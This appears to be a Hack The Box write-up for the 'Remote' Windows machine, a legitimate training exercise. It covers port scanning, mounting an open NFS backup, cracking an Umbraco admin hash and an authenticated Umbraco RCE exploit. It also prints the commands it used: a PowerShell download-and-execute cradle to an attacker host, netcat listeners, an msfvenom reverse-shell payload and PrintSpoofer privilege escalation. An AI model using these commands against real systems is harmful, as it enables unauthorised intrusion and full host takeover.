# Remote
## Information Gathering
#### Master List
- Port 21 - Anonymous FTP login allowed
	- Doesn't seem like anything is in here
- Port 80
	- Lots of directories found. 
- Port 111
	- There is a mount directory: `/site_backups`. Anyone can mount this
- Port 5985 and 47001
	- If I can find some credentials for this, I can login

#### Users
- http://10.10.10.180/umbraco
	- `admin@htb.local:baconandcheese`
- `smith@htb.local`

#### Ports/Services
? 21/tcp      ftp           
? 80/tcp      http          
? 111/tcp     rpcbind       
x 135/tcp     msrpc         
x 139/tcp     netbios-ssn   
x 445/tcp     microsoft-ds? 
x 2049/tcp    mountd        
5985/tcp    http          
47001/tcp   http          
49664/tcp   msrpc         
49665/tcp   msrpc         
49666/tcp   msrpc         
49667/tcp   msrpc         
49678/tcp   msrpc         
49679/tcp   msrpc         
49680/tcp   msrpc 

#### Software
- Port 80
	- JQuery 3.1.0
	- Umbraco 7.15.6

## Enumeration
#### Nmap scan
```bash
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## Exploitation

I mount the `/site_backups` directory and copy in locally for easaier enumeration.
```bash
$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/site_backups -o nolocks
$ cp -r * /tmp/site_backups
```
While I am downloading this share, I read the Umbraco [docs](https://our.umbraco.com/documentation/)

Taking a look into App_Data folder, I found `Umbraco.sdf`.  According to Google, an SDF file is a compact relatioonal database saved in SQL compact format. I tried for a while to convert this file into .db format so I can import into sqllite and look at the entries, but didn't succeed :(

I ended up running strings on the file and got the following:
```
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f

smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e

ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

I eyeball the hash from this output and throw the admin hash into John. Admin hash `b8be16afba8c314ad33d812f22a04991b90e2aaa`
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

baconandcheese   (?)
```
Thus, I got credentials `admin:baconandcheese`

I try eyeballing the other hashs for smith and throwing them into hashid, but couldn't get any good results.

The credentials to the login form at http://10.10.10.180/umbraco is `admin@htb.local:baconandcheese`

I try to figure out how create a page manually to get RCE but didn't succeed. To my surprise, [this](https://www.exploit-db.com/exploits/49488) exploit works despite the version discrepancy.

```bash
$ ./umbraco_auth_rce.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami

iis apppool\defaultapppool
```

Cool, I get RCE. Let's see if I can ping back.
```bash
$ ./umbraco_auth_rce.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c "ping" -a "10.10.14.10"
```
====
```bash
$ sudo tcpdump -i tun0 icmp
16:18:41.653825 IP 10.10.10.180 > 10.10.14.10: ICMP echo request, id 1, seq 1, length 40
16:18:41.653829 IP 10.10.14.10 > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
16:18:42.673623 IP 10.10.10.180 > 10.10.14.10: ICMP echo request, id 1, seq 2, length 40
16:18:42.673628 IP 10.10.14.10 > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
```

Cool. Now that I know I can connect back I should be able to get a reverse shell.

I do the classic three staged AV:
1. Get a copy of Invoke-PowerShellTcp.ps1 and put it up onto your Python HTTP server `python -m http.server 8080`. Don't forget to place `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 53` at the end of Invoke-PowerShellTcp.ps1
2. Start up your listener `nc -lnvp 53`
3. Send the payload and catch a shell (hopefully) 
```bash
$ ./umbraco_auth_rce.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c "powershell" -a "iex(new-object net.webclient).downloadstring('http://10.10.14.10:8080/shell.ps1')"
```

This'll land you as `iis apppool\defaultapppool`

## Privilege Escalation
### Enumeration
As soon as I drop into the box I check permission tokens. I expect to have loose access token privileges because I am a service account. More info on Access Tokens [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens)
```bash
PS> whoami

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Of these, the most intereting one is SeImpersonatePrivilege. [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) has a lot of information on abusing these tokens. For this, I decide to go with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) mainly because I think it has the simplest kill chain. 

### Exploitation
Download PrintSpoofer.exe onto the box along with your favorite reverse shell payload (I used msfvenom to generate a stageless payload `msfvnom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f exe -o reverse.exe`  but there is no reason you shouldn't be able to use something like ncat)
```powershell
Invoke-WebRequest -Uri "http://10.10.14.10:8080/PrintSpoofer.exe" -OutFile "C:\Temp\PrintSpoofer.exe"

Invoke-WebRequest -Uri "http://10.10.14.10:8080/reverse.exe" -OutFile "C:\Temp\reverse.exe"
```

Start up a listener (`nc -lnvp 1337`) and run PrintSpoofer.exe to get a reverse shell as Administrator
```powershell
.\PrintSpoofer -i -c .\reverse.exe
```

## Review and Lessons Learned
Overall, fun box. 

The foothold is interesting and is meant to get you familiar with CMS. Most easy HTB machines that run a web server have some sort of CMS. 
- When testing CMS it's always a good idea to keep a record of all CVE's associated with the CMS.
- Try looking for a CMS scanner
- Web applications contain an enormous amount of information. If there is a login form for authentication then credentials have to be stored somewhere. Typically, web apps have to make a connection to a database somewhere in order to retrieve this information
	- In this scenario, we had access to a backup folder with a compressed database
- If you don't know what a file is ALWAYS DO SOME RESEARCH. I glosssed over Umbraco.sdf on my first scan because I didn't think anything of it. After Googling, I realized that it may be more important than I origianlly thought. 

